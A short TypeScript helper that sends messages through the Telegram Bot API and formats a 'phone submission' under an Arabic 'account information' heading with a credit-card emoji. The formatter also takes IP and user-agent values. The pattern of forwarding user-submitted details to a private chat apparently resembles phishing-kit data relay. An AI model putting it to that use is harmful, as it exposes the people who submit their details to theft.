/**
 * Telegram notification helper
 * Sends messages to a Telegram chat using the Bot API
 */

interface TelegramConfig {
  botToken: string;
  chatId: string;
}

let telegramConfig: TelegramConfig | null = null;

/**
 * Initialize Telegram configuration
 */
export function initTelegram(botToken: string, chatId: string) {
  telegramConfig = { botToken, chatId };
}

/**
 * Send a message to Telegram
 */
export async function sendTelegramMessage(message: string): Promise<boolean> {
  if (!telegramConfig) {
    console.warn("[Telegram] Not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramConfig.chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      console.error("[Telegram] Failed to send message:", data);
      return false;
    }

    console.log("[Telegram] Message sent successfully");
    return true;
  } catch (error) {
    console.error("[Telegram] Error sending message:", error);
    return false;
  }
}

/**
 * Format phone submission for Telegram
 */
export function formatPhoneSubmissionMessage(
  phoneNumber: string,
  ipAddress?: string,
  userAgent?: string
): string {
  return `💳 معلومات الحساب\n\nرقم الهاتف: ${phoneNumber}`;
}

